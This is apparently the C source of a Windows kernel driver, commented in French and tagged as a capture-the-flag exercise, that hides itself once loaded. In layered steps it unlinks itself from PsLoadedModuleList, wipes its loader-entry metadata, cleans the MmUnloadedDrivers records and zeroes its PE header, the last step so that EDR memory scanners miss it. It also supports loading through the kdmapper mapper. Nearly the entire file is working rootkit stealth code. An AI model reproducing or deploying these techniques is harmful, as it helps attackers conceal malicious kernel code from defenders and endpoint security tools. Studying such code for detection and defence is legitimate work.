#include "driver.h"

// ---------------------------------------------------------------------------
// État global pour restauration au déchargement (mode sc/NtLoadDriver)
// ---------------------------------------------------------------------------
static PLDR_DATA_TABLE_ENTRY g_ModuleEntry  = NULL;
static PLIST_ENTRY           g_SavedFlink   = NULL;
static PLIST_ENTRY           g_SavedBlink   = NULL;
static BOOLEAN               g_MapperMode   = FALSE;

// ---------------------------------------------------------------------------
// Couche 1 : retrait de PsLoadedModuleList  (mode sc uniquement)
// ---------------------------------------------------------------------------
VOID HideFromLoadedList(_In_ PDRIVER_OBJECT DriverObject)
{
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) return;

    g_ModuleEntry = entry;
    g_SavedFlink  = entry->InLoadOrderLinks.Flink;
    g_SavedBlink  = entry->InLoadOrderLinks.Blink;

    RemoveEntryList(&entry->InLoadOrderLinks);
    InitializeListHead(&entry->InLoadOrderLinks);

    DbgPrint("[CTF] Couche 1 : retiré de PsLoadedModuleList\n");
}

// ---------------------------------------------------------------------------
// Couche 2 : effacement des champs identifiants dans LDR_DATA_TABLE_ENTRY
// ---------------------------------------------------------------------------
VOID ObfuscateLdrEntry(_In_ PDRIVER_OBJECT DriverObject)
{
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) return;

    if (entry->FullDllName.Buffer && entry->FullDllName.Length > 0) {
        RtlSecureZeroMemory(entry->FullDllName.Buffer, entry->FullDllName.Length);
        entry->FullDllName.Length = entry->FullDllName.MaximumLength = 0;
    }
    if (entry->BaseDllName.Buffer && entry->BaseDllName.Length > 0) {
        RtlSecureZeroMemory(entry->BaseDllName.Buffer, entry->BaseDllName.Length);
        entry->BaseDllName.Length = entry->BaseDllName.MaximumLength = 0;
    }
    entry->TimeDateStamp = 0;
    entry->CheckSum      = 0;

    DbgPrint("[CTF] Couche 2 : métadonnées LDR effacées\n");
}

// ---------------------------------------------------------------------------
// Couche 3 : nettoyage de MmUnloadedDrivers
// ---------------------------------------------------------------------------
VOID CleanMmUnloadedDrivers(PVOID ImageBase, ULONG ImageSize)
{
    UNICODE_STRING mmUnloadedName = RTL_CONSTANT_STRING(L"MmUnloadedDrivers");
    UNICODE_STRING mmLastName     = RTL_CONSTANT_STRING(L"MmLastUnloadedDriver");

    PMM_UNLOADED_DRIVER pTable =
        (PMM_UNLOADED_DRIVER)MmGetSystemRoutineAddress(&mmUnloadedName);
    PULONG pLast =
        (PULONG)MmGetSystemRoutineAddress(&mmLastName);

    if (!pTable || !pLast) {
        DbgPrint("[CTF] Couche 3 : MmUnloadedDrivers non exporté, skip\n");
        return;
    }

    PVOID imageEnd = (PVOID)((ULONG_PTR)ImageBase + ImageSize);

    for (ULONG i = 0; i < MM_UNLOADED_DRIVERS_SIZE; i++) {
        if (pTable[i].ModuleStart >= ImageBase &&
            pTable[i].ModuleStart <  imageEnd)
        {
            if (pTable[i].Name.Buffer) {
                RtlSecureZeroMemory(pTable[i].Name.Buffer, pTable[i].Name.Length);
                pTable[i].Name.Length = pTable[i].Name.MaximumLength = 0;
                pTable[i].Name.Buffer = NULL;
            }
            pTable[i].ModuleStart = NULL;
            pTable[i].ModuleEnd   = NULL;
            pTable[i].UnloadTime  = 0;
        }
    }
    DbgPrint("[CTF] Couche 3 : MmUnloadedDrivers nettoyé\n");
}

// ---------------------------------------------------------------------------
// Couche 4 : effacement de l'en-tête PE en mémoire  (mapper + sc)
//
// L'en-tête MZ/PE contient : nom du fichier, timestamp de compilation,
// checksum, imports. Les scanners mémoire (comme ceux des EDR) cherchent
// des pages avec signature "MZ" suivi d'un PE valide à des adresses noyau.
// Zeroing des 0x1000 premiers octets casse cette heuristique.
// ---------------------------------------------------------------------------
VOID ErasePeHeader(PVOID ImageBase)
{
    if (!ImageBase) return;

    PMDL mdl = IoAllocateMdl(ImageBase, PAGE_SIZE, FALSE, FALSE, NULL);
    if (!mdl) return;

    __try {
        MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
        PVOID mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode,
                            MmNonCached, NULL, FALSE, NormalPagePriority);
        if (mapped) {
            RtlSecureZeroMemory(mapped, PAGE_SIZE);
            MmUnmapLockedPages(mapped, mdl);
        }
        MmUnlockPages(mdl);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[CTF] Couche 4 : exception lors du zeroing PE header\n");
    }
    IoFreeMdl(mdl);

    DbgPrint("[CTF] Couche 4 : en-tête PE effacé\n");
}

// ---------------------------------------------------------------------------
// Restauration PsLoadedModuleList avant déchargement
// ---------------------------------------------------------------------------
VOID RestoreSelf(VOID)
{
    if (!g_ModuleEntry || !g_SavedBlink) return;

    g_ModuleEntry->InLoadOrderLinks.Flink = g_SavedBlink->Flink;
    g_ModuleEntry->InLoadOrderLinks.Blink = g_SavedBlink;
    g_SavedBlink->Flink->Blink = &g_ModuleEntry->InLoadOrderLinks;
    g_SavedBlink->Flink        = &g_ModuleEntry->InLoadOrderLinks;

    g_ModuleEntry = NULL;
    DbgPrint("[CTF] PsLoadedModuleList restauré\n");
}

// ---------------------------------------------------------------------------
// DriverUnload
// ---------------------------------------------------------------------------
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    if (!g_MapperMode) {
        CleanMmUnloadedDrivers(DriverObject->DriverStart, DriverObject->DriverSize);
        RestoreSelf();
    }
    DbgPrint("[CTF] Driver déchargé\n");
}

// ---------------------------------------------------------------------------
// DriverEntry
//
// Compatible deux modes de chargement :
//
//   Mode sc/NtLoadDriver (standard) :
//     DriverObject != NULL, DriverSection valide.
//     On retire de PsLoadedModuleList + on efface les métadonnées LDR.
//
//   Mode mapper (ex: kdmapper) :
//     DriverObject == NULL ou DriverSection == NULL.
//     Le mapper n'a jamais enregistré le driver nulle part :
//     PsLoadedModuleList, registre, PiDDBCacheTable sont déjà vierges.
//     On se contente d'effacer l'en-tête PE (couche 4).
// ---------------------------------------------------------------------------
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrint("[CTF] DriverEntry appelé\n");

    PVOID  imageBase = NULL;
    ULONG  imageSize = 0;

    if (DriverObject && DriverObject->DriverSection) {
        // --- Mode chargement standard ---
        g_MapperMode = FALSE;
        DriverObject->DriverUnload = DriverUnload;

        imageBase = DriverObject->DriverStart;
        imageSize = DriverObject->DriverSize;

        HideFromLoadedList(DriverObject);   // Couche 1
        ObfuscateLdrEntry(DriverObject);    // Couche 2
        // Couche 3 au déchargement via DriverUnload

    } else {
        // --- Mode mapper ---
        g_MapperMode = TRUE;
        DbgPrint("[CTF] Mode mapper détecté — listes déjà vierges\n");

        // Retrouver notre propre base : le mapper passe souvent
        // imageBase en RegistryPath (convention kdmapper) ou on la
        // déduit depuis l'adresse de retour de DriverEntry.
        if (RegistryPath && (ULONG_PTR)RegistryPath > (ULONG_PTR)MmSystemRangeStart) {
            imageBase = (PVOID)RegistryPath;
        }
    }

    // Couche 4 : effacement en-tête PE (tous modes)
    if (imageBase) {
        ErasePeHeader(imageBase);
    }

    DbgPrint("[CTF] Dissimulation terminée (mode %s)\n",
             g_MapperMode ? "mapper" : "standard");
    return STATUS_SUCCESS;
}
